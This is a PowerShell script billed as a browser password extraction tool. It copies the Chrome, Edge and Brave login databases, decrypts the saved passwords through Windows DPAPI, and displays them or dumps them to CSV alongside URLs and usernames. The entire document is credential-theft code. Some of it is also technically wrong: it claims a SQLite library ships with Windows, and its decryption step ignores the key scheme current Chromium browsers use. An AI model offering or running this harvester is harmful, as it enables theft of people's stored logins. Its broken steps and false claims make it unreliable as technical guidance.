# Browser Password Extraction Script
# Uses only native PowerShell functionality
# Extracts passwords from Chrome, Edge, and Brave on Windows

param(
    [switch]$ExportToCSV,
    [string]$CSVPath = ".\BrowserPasswords.csv"
)

# Function to decrypt Chrome/Edge password (using Windows Data Protection API)
function Get-DecryptedPassword {
    param([byte[]]$EncryptedData)
    
    try {
        # Only works for the current user as encryption is tied to user account
        $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect(
            $EncryptedData, 
            $null, 
            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
        )
        return [System.Text.Encoding]::UTF8.GetString($decrypted)
    } catch {
        Write-Warning "Failed to decrypt password: $($_.Exception.Message)"
        return "[Decryption Failed]"
    }
}

# Function to query SQLite database (using .NET libraries)
function Invoke-SQLiteQuery {
    param(
        [string]$DatabasePath,
        [string]$Query
    )
    
    try {
        # Load System.Data.SQLite assembly (should be available on Windows 10+)
        Add-Type -Path "$env:SYSTEMROOT\Microsoft.NET\assembly\GAC_64\System.Data.SQLite\v4.0_1.0.115.5__db937bc2d44ff139\System.Data.SQLite.dll" -ErrorAction Stop
    } catch {
        try {
            # Try 32-bit path
            Add-Type -Path "$env:SYSTEMROOT\Microsoft.NET\assembly\GAC_32\System.Data.SQLite\v4.0_1.0.115.5__db937bc2d44ff139\System.Data.SQLite.dll" -ErrorAction Stop
        } catch {
            Write-Warning "System.Data.SQLite assembly not found. SQLite operations unavailable."
            return @()
        }
    }
    
    $results = @()
    $connectionString = "Data Source=$DatabasePath;"
    
    try {
        $connection = New-Object System.Data.SQLite.SQLiteConnection($connectionString)
        $connection.Open()
        
        $command = $connection.CreateCommand()
        $command.CommandText = $Query
        
        $adapter = New-Object System.Data.SQLite.SQLiteDataAdapter $command
        $dataset = New-Object System.Data.DataSet
        [void]$adapter.Fill($dataset)
        
        $results = $dataset.Tables[0]
    } catch {
        Write-Warning "Error querying database $DatabasePath : $($_.Exception.Message)"
    } finally {
        if ($connection -and $connection.State -eq 'Open') {
            $connection.Close()
        }
    }
    
    return $results
}

# Function to extract passwords from a browser
function Get-BrowserPasswords {
    param(
        [string]$BrowserName,
        [string]$DataPath
    )
    
    Write-Host "Checking $BrowserName..." -ForegroundColor Yellow
    
    $loginDataPath = Join-Path $DataPath "Default\Login Data"
    if (-not (Test-Path $loginDataPath)) {
        Write-Warning "$BrowserName login database not found at $loginDataPath"
        return @()
    }
    
    # Copy the database to avoid locking issues
    $tempDbPath = [System.IO.Path]::GetTempFileName()
    Copy-Item $loginDataPath $tempDbPath -Force
    
    try {
        # Query the logins database
        $query = "SELECT origin_url, username_value, password_value FROM logins"
        $logins = Invoke-SQLiteQuery -DatabasePath $tempDbPath -Query $query
        
        $results = @()
        foreach ($login in $logins) {
            $decryptedPassword = Get-DecryptedPassword $login.password_value
            $results += [PSCustomObject]@{
                Browser = $BrowserName
                URL = $login.origin_url
                Username = $login.username_value
                Password = $decryptedPassword
            }
        }
        
        return $results
    } catch {
        Write-Warning "Error processing $BrowserName data: $($_.Exception.Message)"
        return @()
    } finally {
        # Clean up temporary file
        if (Test-Path $tempDbPath) {
            Remove-Item $tempDbPath -Force
        }
    }
}

# Main execution
Write-Host "Browser Password Extraction Tool" -ForegroundColor Green
Write-Host "================================`n" -ForegroundColor Green

# Define browser paths
$browsers = @(
    @{Name = "Google Chrome"; DataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data"},
    @{Name = "Microsoft Edge"; DataPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"},
    @{Name = "Brave Browser"; DataPath = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"}
)

$allPasswords = @()

foreach ($browser in $browsers) {
    if (Test-Path $browser.DataPath) {
        $passwords = Get-BrowserPasswords -BrowserName $browser.Name -DataPath $browser.DataPath
        $allPasswords += $passwords
    } else {
        Write-Host "$($browser.Name) not found at $($browser.DataPath)" -ForegroundColor DarkGray
    }
}

# Display results
if ($allPasswords.Count -gt 0) {
    Write-Host "`nFound $($allPasswords.Count) saved passwords:`n" -ForegroundColor Green
    
    $allPasswords | Format-Table -Property Browser, URL, Username, Password -AutoSize
    
    # Export to CSV if requested
    if ($ExportToCSV) {
        try {
            $allPasswords | Export-Csv -Path $CSVPath -NoTypeInformation
            Write-Host "`nPasswords exported to: $CSVPath" -ForegroundColor Green
        } catch {
            Write-Warning "Failed to export to CSV: $($_.Exception.Message)"
        }
    }
} else {
    Write-Host "`nNo passwords found in any browser." -ForegroundColor Yellow
}

Write-Host "`nNote: This tool can only decrypt passwords for the currently logged-in user." -ForegroundColor Cyan
Write-Host "It requires that browsers are not running during execution." -ForegroundColor Cyan
